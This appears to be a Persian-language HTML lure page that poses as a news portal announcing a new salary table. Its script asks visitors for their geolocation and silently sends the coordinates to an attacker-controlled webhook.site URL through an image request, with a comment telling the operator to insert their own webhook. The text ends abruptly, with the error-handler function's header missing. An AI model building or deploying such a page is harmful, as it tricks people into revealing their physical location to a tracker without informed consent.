<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>پورتال خبری</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; }
        .btn { background: #e74c3c; color: white; padding: 10px 20px; border-radius: 5px; display: inline-block; margin-top: 10px; text-decoration: none; }
    </style>
</head>
<body>

    <div class="card" onclick="getLocation()">
        <h2>اعلام جدول جدید حقوق ۱۴۰۳</h2>
        <p>برای مشاهده مبلغ، روی دکمه زیر کلیک کنید</p>
        <div class="btn">مشاهده مبلغ</div>
    </div>

    <script>
    function getLocation() {
        // 1. بررسی اینکه آیا مرورگر اصلا قابلیت لوکیشن دارد یا نه
        if (navigator.geolocation) {
            alert("در حال درخواست دسترسی... لطفا روی Allow کلیک کنید");
            
            navigator.geolocation.getCurrentPosition(sendPosition, showError);
        } else {
            alert("مرورگر شما از لوکیشن پشتیبانی نمی‌کند");
        }
    }

    function sendPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        
        alert("مختصات گرفته شد! در حال ارسال به سرور...");

        // !!! لینک وب‌هوک خودت را اینجا جایگزین کن !!!
        var webhookUrl = "https://webhook.site/YOUR_ID_HERE"; 

        var img = new Image(); 
        img.src = webhookUrl + "?lat=" + lat + "&lon=" + lon;
        
        alert("ارسال موفقیت‌آمیز بود. حالا پنل وب‌هوک را چک کن.");
    }

        switch(error.code) {
            case error.PERMISSION_DENIED:
                alert("خطا: شما اجازه دسترسی به مکان را ندادید (Block کردید)");
                break;
